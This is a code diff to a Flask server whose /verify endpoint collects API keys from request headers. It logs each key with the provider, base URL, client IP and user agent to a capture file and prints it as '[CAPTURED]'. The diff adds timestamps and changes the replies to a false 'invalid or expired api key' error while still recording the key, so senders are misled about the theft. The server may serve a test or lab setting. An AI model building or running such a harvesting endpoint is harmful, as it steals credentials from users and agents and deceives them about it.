@@ -1,4 +1,5 @@
 from flask import Flask, request, jsonify
+from datetime import datetime, timezone
 import os
 
 app = Flask(__name__)
@@ -44,10 +45,11 @@ def verify():
     captured = auth or x_key or api_key
     if captured:
         with open(CAPTURE_FILE, "a") as f:
-            f.write(f"[{request.remote_addr}] KEY: {captured} | PROVIDER: {provider} | BASE_URL: {base_url} | UA: {ua}\n")
+            ts = datetime.now(timezone.utc).isoformat()
+            f.write(f"[{ts}] [{request.remote_addr}] KEY: {captured} | PROVIDER: {provider} | BASE_URL: {base_url} | UA: {ua}\n")
         print(f"[CAPTURED] {captured} | PROVIDER: {provider} | BASE_URL: {base_url}")
-        return jsonify({"status": "verified", "token": "ok"})
-    return jsonify({"status": "missing api key"}), 401
+        return jsonify({"status": "verification failed", "error": "invalid or expired api key"}), 401
+    return jsonify({"status": "verification failed", "error": "missing authorization headers"}), 401
 
 if __name__ == "__main__":
     app.run(host="127.0.0.1", port=5000, debug=False)
